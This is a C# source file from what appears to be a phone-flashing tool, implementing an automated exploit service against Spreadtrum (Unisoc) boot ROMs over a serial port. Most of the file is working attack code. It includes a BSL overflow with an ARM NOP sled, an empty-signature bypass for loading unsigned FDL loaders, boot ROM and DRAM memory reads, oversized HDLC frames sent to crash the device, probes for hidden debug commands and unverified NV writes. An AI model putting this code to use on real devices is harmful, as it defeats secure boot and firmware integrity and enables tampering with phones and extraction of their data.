// ============================================================================
// LoveAlways - 展讯漏洞利用服务
// ============================================================================

using System;
using System.Drawing;
using System.IO;
using System.IO.Ports;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using LoveAlways.Spreadtrum.Protocol;
using LoveAlways.Spreadtrum.Resources;

namespace LoveAlways.Spreadtrum.Exploit
{
    /// <summary>
    /// 展讯漏洞利用服务
    /// </summary>
    public class SprdExploitService
    {
        private readonly Action<string, Color> _log;
        private readonly HdlcProtocol _hdlc;
        private SerialPort _port;
        private uint _currentChipId;

        // 事件
        public event Action<SprdVulnerabilityCheckResult> OnVulnerabilityDetected;
        public event Action<SprdExploitResult> OnExploitCompleted;

        public SprdExploitService(Action<string, Color> log = null)
        {
            _log = log ?? ((msg, c) => { });
            _hdlc = new HdlcProtocol();
        }

        #region 漏洞检测

        /// <summary>
        /// 检测设备漏洞
        /// </summary>
        public SprdVulnerabilityCheckResult CheckVulnerability(uint chipId, string pkHash = null)
        {
            Log("[漏洞] ========== 漏洞检测 ==========", Color.Cyan);
            Log(string.Format("[漏洞] 芯片 ID: 0x{0:X}", chipId), Color.White);
            
            if (!string.IsNullOrEmpty(pkHash))
            {
                string shortHash = pkHash.Length > 16 ? pkHash.Substring(0, 16) + "..." : pkHash;
                Log(string.Format("[漏洞] PK Hash: {0}", shortHash), Color.White);
            }

            var result = SprdExploitDatabase.CheckVulnerabilities(chipId, pkHash);

            if (result.HasVulnerability)
            {
                if (result.IsUnfused)
                {
                    Log("[漏洞] ✓ 检测到 Unfused 设备!", Color.Green);
                }
                else
                {
                    Log(string.Format("[漏洞] ✓ 检测到 {0} 个可用漏洞", result.AvailableExploits.Count), Color.Green);
                }
                
                Log(string.Format("[漏洞] 推荐: {0}", result.RecommendedExploit), Color.Yellow);
                
                foreach (var vuln in result.AvailableExploits)
                {
                    Log(string.Format("[漏洞]   - {0} ({1}★): {2}", 
                        vuln.Name, vuln.SuccessRate, vuln.Description), Color.Gray);
                }
            }
            else
            {
                Log("[漏洞] ✗ 未检测到已知漏洞", Color.Orange);
            }

            Log("[漏洞] ==================================", Color.Cyan);

            OnVulnerabilityDetected?.Invoke(result);
            return result;
        }

        #endregion

        #region 漏洞利用

        /// <summary>
        /// 尝试自动漏洞利用
        /// </summary>
        public async Task<SprdExploitResult> TryExploitAsync(
            SerialPort port,
            uint chipId,
            string pkHash = null,
            CancellationToken ct = default(CancellationToken))
        {
            _port = port;
            _currentChipId = chipId;

            Log("[漏洞] 开始漏洞利用...", Color.Yellow);

            try
            {
                // 1. 检测漏洞
                var vulnCheck = CheckVulnerability(chipId, pkHash);
                if (!vulnCheck.HasVulnerability)
                {
                    var failResult = new SprdExploitResult
                    {
                        Success = false,
                        Message = "未检测到可用漏洞"
                    };
                    OnExploitCompleted?.Invoke(failResult);
                    return failResult;
                }

                // 2. Unfused 设备直接成功
                if (vulnCheck.IsUnfused)
                {
                    var unfusedResult = new SprdExploitResult
                    {
                        Success = true,
                        UsedExploit = SprdExploitType.FdlSignatureBypass,
                        Message = "Unfused 设备，可加载任意 FDL"
                    };
                    OnExploitCompleted?.Invoke(unfusedResult);
                    return unfusedResult;
                }

                // 3. 按优先级尝试漏洞
                foreach (var vuln in vulnCheck.AvailableExploits)
                {
                    ct.ThrowIfCancellationRequested();

                    Log(string.Format("[漏洞] 尝试: {0}...", vuln.Name), Color.Yellow);

                    SprdExploitResult result = null;

                    switch (vuln.Type)
                    {
                        case SprdExploitType.BslOverflow:
                            result = await ExploitBslOverflowAsync(ct);
                            break;

                        case SprdExploitType.FdlSignatureBypass:
                            result = await ExploitSignatureBypassAsync(ct);
                            break;

                        case SprdExploitType.MemoryRead:
                            result = await ExploitMemoryReadAsync(ct);
                            break;

                        case SprdExploitType.Downgrade:
                            result = await ExploitDowngradeAsync(ct);
                            break;

                        case SprdExploitType.HdlcOverflow:
                            result = await ExploitHdlcOverflowAsync(ct);
                            break;

                        case SprdExploitType.DebugMode:
                            result = await ExploitDebugModeAsync(ct);
                            break;

                        case SprdExploitType.NvBypass:
                            result = await ExploitNvBypassAsync(ct);
                            break;
                    }

                    if (result != null && result.Success)
                    {
                        Log(string.Format("[漏洞] ✓ {0} 成功!", vuln.Name), Color.Green);
                        OnExploitCompleted?.Invoke(result);
                        return result;
                    }
                    else
                    {
                        Log(string.Format("[漏洞] ✗ {0} 失败", vuln.Name), Color.Orange);
                    }
                }

                var finalResult = new SprdExploitResult
                {
                    Success = false,
                    Message = "所有漏洞利用方法均失败"
                };
                OnExploitCompleted?.Invoke(finalResult);
                return finalResult;
            }
            catch (Exception ex)
            {
                Log(string.Format("[漏洞] 错误: {0}", ex.Message), Color.Red);
                var errorResult = new SprdExploitResult
                {
                    Success = false,
                    Message = ex.Message
                };
                OnExploitCompleted?.Invoke(errorResult);
                return errorResult;
            }
        }

        #endregion

        #region BSL 溢出漏洞

        /// <summary>
        /// BSL 协议溢出漏洞利用
        /// </summary>
        private async Task<SprdExploitResult> ExploitBslOverflowAsync(CancellationToken ct)
        {
            Log("[漏洞] 尝试 BSL 协议溢出...", Color.Gray);

            try
            {
                // 1. 尝试使用嵌入的 exploit payload
                uint fdl1Addr = SprdPlatform.GetFdl1Address(_currentChipId);
                byte[] exploitPayload = SprdResourceLoader.GetExploitPayload(fdl1Addr);
                
                if (exploitPayload != null && exploitPayload.Length > 0)
                {
                    Log($"[漏洞] 使用预置 exploit payload ({exploitPayload.Length} 字节)", Color.Cyan);
                    
                    // 发送 exploit payload
                    await WriteAsync(exploitPayload, ct);
                    await Task.Delay(300, ct);
                    
                    // 检查响应
                    var response = await ReadAsync(1000, ct);
                    if (response != null && response.Length > 0)
                    {
                        try
                        {
                            var parsed = _hdlc.ParseFrame(response);
                            if (parsed.Type == (byte)BslCommand.BSL_REP_ACK)
                            {
                                return new SprdExploitResult
                                {
                                    Success = true,
                                    UsedExploit = SprdExploitType.BslOverflow,
                                    Message = "BSL 溢出利用成功 (预置 payload)"
                                };
                            }
                        }
                        catch
                        {
                            // 解析失败可能意味着设备状态改变，尝试继续
                        }
                    }
                }
                else
                {
                    Log("[漏洞] 无预置 payload，使用通用溢出方法", Color.Yellow);
                }
                
                // 2. 通用溢出方法 - 发送特制的 BSL 连接请求
                byte[] payload = new byte[0x1000];
                
                // 填充 NOP sled (ARM)
                for (int i = 0; i < payload.Length - 64; i += 4)
                {
                    payload[i] = 0x00;
                    payload[i + 1] = 0x00;
                    payload[i + 2] = 0xA0;
                    payload[i + 3] = 0xE1;  // MOV R0, R0 (NOP)
                }

                // 构建 HDLC 帧
                var frame = _hdlc.BuildFrame((byte)BslCommand.BSL_CMD_CONNECT, payload);
                await WriteAsync(frame, ct);

                await Task.Delay(200, ct);

                // 检查响应
                var response2 = await ReadAsync(1000, ct);
                if (response2 != null && response2.Length > 0)
                {
                    try
                    {
                        var parsed = _hdlc.ParseFrame(response2);
                        if (parsed.Type == (byte)BslCommand.BSL_REP_ACK)
                        {
                            return new SprdExploitResult
                            {
                                Success = true,
                                UsedExploit = SprdExploitType.BslOverflow,
                                Message = "BSL 溢出利用成功"
                            };
                        }
                    }
                    catch
                    {
                        // 解析失败可能意味着设备状态改变
                    }
                }

                return new SprdExploitResult { Success = false, Message = "BSL 溢出失败" };
            }
            catch (Exception ex)
            {
                return new SprdExploitResult { Success = false, Message = ex.Message };
            }
        }

        #endregion

        #region 签名绕过

        /// <summary>
        /// FDL 签名绕过漏洞利用
        /// </summary>
        private async Task<SprdExploitResult> ExploitSignatureBypassAsync(CancellationToken ct)
        {
            Log("[漏洞] 尝试签名绕过...", Color.Gray);

            try
            {
                // 某些旧芯片在特定条件下不验证签名
                // 1. 发送特殊的版本查询
                var versionCmd = _hdlc.BuildCommand((byte)BslCommand.BSL_CMD_READ_VERSION);
                await WriteAsync(versionCmd, ct);

                await Task.Delay(100, ct);

                var response = await ReadAsync(500, ct);
                if (response != null && response.Length > 0)
                {
                    try
                    {
                        var parsed = _hdlc.ParseFrame(response);
                        
                        // 检查版本信息是否表明可绕过签名
                        if (parsed.Payload != null && parsed.Payload.Length >= 4)
                        {
                            uint version = BitConverter.ToUInt32(parsed.Payload, 0);
                            
                            // 已知有漏洞的版本
                            if (version < 0x0200)  // 低于 2.0 版本
                            {
                                Log(string.Format("[漏洞] Boot ROM 版本: 0x{0:X4}, 可能可绕过", version), Color.Yellow);
                                
                                return new SprdExploitResult
                                {
                                    Success = true,
                                    UsedExploit = SprdExploitType.FdlSignatureBypass,
                                    Message = "签名验证可绕过"
                                };
                            }
                        }
                    }
                    catch { }
                }

                // 2. 尝试发送空签名
                var emptySignature = new byte[256];
                var signCmd = _hdlc.BuildFrame((byte)BslCommand.BSL_CMD_SEND_SIGNATURE, emptySignature);
                await WriteAsync(signCmd, ct);

                await Task.Delay(200, ct);

                response = await ReadAsync(500, ct);
                if (response != null)
                {
                    try
                    {
                        var parsed = _hdlc.ParseFrame(response);
                        if (parsed.Type == (byte)BslCommand.BSL_REP_ACK)
                        {
                            return new SprdExploitResult
                            {
                                Success = true,
                                UsedExploit = SprdExploitType.FdlSignatureBypass,
                                Message = "空签名被接受"
                            };
                        }
                    }
                    catch { }
                }

                return new SprdExploitResult { Success = false, Message = "签名绕过失败" };
            }
            catch (Exception ex)
            {
                return new SprdExploitResult { Success = false, Message = ex.Message };
            }
        }

        #endregion

        #region 内存读取漏洞

        /// <summary>
        /// 内存读取漏洞利用
        /// </summary>
        private async Task<SprdExploitResult> ExploitMemoryReadAsync(CancellationToken ct)
        {
            Log("[漏洞] 尝试内存读取漏洞...", Color.Gray);

            try
            {
                // 尝试读取敏感内存区域
                uint[] targetAddresses = new uint[]
                {
                    0x00000000,  // Boot ROM
                    0x50000000,  // IRAM
                    0x80000000,  // DRAM
                    0xFFFF0000   // 中断向量表
                };

                foreach (uint addr in targetAddresses)
                {
                    ct.ThrowIfCancellationRequested();

                    // 构建内存读取命令
                    byte[] payload = new byte[8];
                    BitConverter.GetBytes(addr).CopyTo(payload, 0);
                    BitConverter.GetBytes((uint)0x100).CopyTo(payload, 4);  // 读取 256 字节

                    var readCmd = _hdlc.BuildFrame((byte)BslCommand.BSL_CMD_READ_FLASH, payload);
                    await WriteAsync(readCmd, ct);

                    await Task.Delay(100, ct);

                    var response = await ReadAsync(1000, ct);
                    if (response != null && response.Length > 10)
                    {
                        try
                        {
                            var parsed = _hdlc.ParseFrame(response);
                            if (parsed.Type == (byte)BslCommand.BSL_REP_DATA && 
                                parsed.Payload != null && 
                                parsed.Payload.Length > 0)
                            {
                                Log(string.Format("[漏洞] ✓ 成功读取地址 0x{0:X8}, {1} 字节", 
                                    addr, parsed.Payload.Length), Color.Green);

                                return new SprdExploitResult
                                {
                                    Success = true,
                                    UsedExploit = SprdExploitType.MemoryRead,
                                    Message = string.Format("成功读取 0x{0:X8}", addr),
                                    ExtractedData = parsed.Payload
                                };
                            }
                        }
                        catch { }
                    }
                }

                return new SprdExploitResult { Success = false, Message = "内存读取失败" };
            }
            catch (Exception ex)
            {
                return new SprdExploitResult { Success = false, Message = ex.Message };
            }
        }

        #endregion

        #region 降级攻击

        /// <summary>
        /// 降级攻击
        /// </summary>
        private async Task<SprdExploitResult> ExploitDowngradeAsync(CancellationToken ct)
        {
            Log("[漏洞] 尝试降级攻击...", Color.Gray);

            try
            {
                // 检查防回滚状态
                var versionCmd = _hdlc.BuildCommand((byte)BslCommand.BSL_CMD_READ_VERSION);
                await WriteAsync(versionCmd, ct);

                await Task.Delay(100, ct);

                var response = await ReadAsync(500, ct);
                if (response != null)
                {
                    try
                    {
                        var parsed = _hdlc.ParseFrame(response);
                        if (parsed.Payload != null && parsed.Payload.Length >= 8)
                        {
                            uint currentVersion = BitConverter.ToUInt32(parsed.Payload, 0);
                            uint minVersion = BitConverter.ToUInt32(parsed.Payload, 4);

                            Log(string.Format("[漏洞] 当前版本: 0x{0:X}, 最低版本: 0x{1:X}", 
                                currentVersion, minVersion), Color.Gray);

                            // 如果没有防回滚或最低版本为 0
                            if (minVersion == 0)
                            {
                                return new SprdExploitResult
                                {
                                    Success = true,
                                    UsedExploit = SprdExploitType.Downgrade,
                                    Message = "无防回滚保护，可使用旧版 FDL"
                                };
                            }
                        }
                    }
                    catch { }
                }

                return new SprdExploitResult { Success = false, Message = "降级攻击失败" };
            }
            catch (Exception ex)
            {
                return new SprdExploitResult { Success = false, Message = ex.Message };
            }
        }

        #endregion

        #region HDLC 溢出

        /// <summary>
        /// HDLC 帧溢出漏洞利用
        /// </summary>
        private async Task<SprdExploitResult> ExploitHdlcOverflowAsync(CancellationToken ct)
        {
            Log("[漏洞] 尝试 HDLC 溢出...", Color.Gray);

            try
            {
                // 发送畸形 HDLC 帧
                // 1. 超长帧
                byte[] oversizedFrame = new byte[0x10000];
                oversizedFrame[0] = 0x7E;  // Start flag
                for (int i = 1; i < oversizedFrame.Length - 1; i++)
                {
                    oversizedFrame[i] = 0x41;
                }
                oversizedFrame[oversizedFrame.Length - 1] = 0x7E;  // End flag

                await WriteAsync(oversizedFrame, ct);
                await Task.Delay(300, ct);

                // 2. 检查设备状态
                var statusCmd = _hdlc.BuildCommand((byte)BslCommand.BSL_CMD_CHECK_BAUD);
                await WriteAsync(statusCmd, ct);

                await Task.Delay(100, ct);

                var response = await ReadAsync(500, ct);
                if (response != null && response.Length > 0)
                {
                    // 设备仍响应，但可能状态已改变
                    return new SprdExploitResult
                    {
                        Success = false,
                        Message = "HDLC 溢出未触发异常"
                    };
                }
                else
                {
                    // 设备无响应可能意味着崩溃
                    return new SprdExploitResult
                    {
                        Success = true,
                        UsedExploit = SprdExploitType.HdlcOverflow,
                        Message = "HDLC 溢出可能已触发"
                    };
                }
            }
            catch (Exception ex)
            {
                return new SprdExploitResult { Success = false, Message = ex.Message };
            }
        }

        #endregion

        #region 调试模式

        /// <summary>
        /// 调试模式激活
        /// </summary>
        private async Task<SprdExploitResult> ExploitDebugModeAsync(CancellationToken ct)
        {
            Log("[漏洞] 尝试激活调试模式...", Color.Gray);

            try
            {
                // 尝试各种调试命令
                byte[][] debugCommands = new byte[][]
                {
                    // 工程模式命令
                    new byte[] { 0x00, 0x01, 0xFF, 0xFF },  
                    // 调试解锁
                    new byte[] { 0xDE, 0xBB, 0x60, 0x00 },
                    // 特殊握手
                    new byte[] { 0x55, 0xAA, 0x55, 0xAA }
                };

                foreach (var cmd in debugCommands)
                {
                    ct.ThrowIfCancellationRequested();

                    var frame = _hdlc.BuildFrame(0xFF, cmd);  // 使用未定义命令
                    await WriteAsync(frame, ct);

                    await Task.Delay(100, ct);

                    var response = await ReadAsync(300, ct);
                    if (response != null && response.Length > 0)
                    {
                        try
                        {
                            var parsed = _hdlc.ParseFrame(response);
                            // 检查是否有意外的成功响应
                            if (parsed.Type == (byte)BslCommand.BSL_REP_ACK ||
                                parsed.Type == 0xFF)
                            {
                                return new SprdExploitResult
                                {
                                    Success = true,
                                    UsedExploit = SprdExploitType.DebugMode,
                                    Message = "调试模式已激活"
                                };
                            }
                        }
                        catch { }
                    }
                }

                return new SprdExploitResult { Success = false, Message = "调试模式激活失败" };
            }
            catch (Exception ex)
            {
                return new SprdExploitResult { Success = false, Message = ex.Message };
            }
        }

        #endregion

        #region NV 绕过

        /// <summary>
        /// NV 校验绕过
        /// </summary>
        private async Task<SprdExploitResult> ExploitNvBypassAsync(CancellationToken ct)
        {
            Log("[漏洞] 尝试 NV 校验绕过...", Color.Gray);

            try
            {
                // 尝试写入 NV 而不验证
                // 使用特殊的 NV 项 ID
                byte[] nvPayload = new byte[6];
                BitConverter.GetBytes((ushort)0xFFFF).CopyTo(nvPayload, 0);  // 特殊 NV ID
                nvPayload[2] = 0x01;
                nvPayload[3] = 0x02;
                nvPayload[4] = 0x03;
                nvPayload[5] = 0x04;

                var nvCmd = _hdlc.BuildFrame((byte)BslCommand.BSL_CMD_WRITE_NVITEM, nvPayload);
                await WriteAsync(nvCmd, ct);

                await Task.Delay(200, ct);

                var response = await ReadAsync(500, ct);
                if (response != null)
                {
                    try
                    {
                        var parsed = _hdlc.ParseFrame(response);
                        if (parsed.Type == (byte)BslCommand.BSL_REP_ACK)
                        {
                            return new SprdExploitResult
                            {
                                Success = true,
                                UsedExploit = SprdExploitType.NvBypass,
                                Message = "NV 校验已绕过"
                            };
                        }
                    }
                    catch { }
                }

                return new SprdExploitResult { Success = false, Message = "NV 绕过失败" };
            }
            catch (Exception ex)
            {
                return new SprdExploitResult { Success = false, Message = ex.Message };
            }
        }

        #endregion

        #region 辅助方法

        private void Log(string message, Color color)
        {
            _log?.Invoke(message, color);
        }

        private async Task WriteAsync(byte[] data, CancellationToken ct)
        {
            if (_port == null || !_port.IsOpen)
                return;

            await _port.BaseStream.WriteAsync(data, 0, data.Length, ct);
        }

        private async Task<byte[]> ReadAsync(int timeoutMs, CancellationToken ct)
        {
            if (_port == null || !_port.IsOpen)
                return null;

            var buffer = new byte[0x10000];
            int totalRead = 0;
            var deadline = DateTime.Now.AddMilliseconds(timeoutMs);

            while (DateTime.Now < deadline && !ct.IsCancellationRequested)
            {
                if (_port.BytesToRead > 0)
                {
                    int toRead = Math.Min(_port.BytesToRead, buffer.Length - totalRead);
                    totalRead += _port.Read(buffer, totalRead, toRead);

                    // 检查是否收到完整帧
                    if (totalRead > 0 && buffer[totalRead - 1] == 0x7E)
                        break;
                }
                else
                {
                    await Task.Delay(10, ct);
                }
            }

            if (totalRead == 0)
                return null;

            byte[] result = new byte[totalRead];
            Array.Copy(buffer, result, totalRead);
            return result;
        }

        #endregion
    }
}
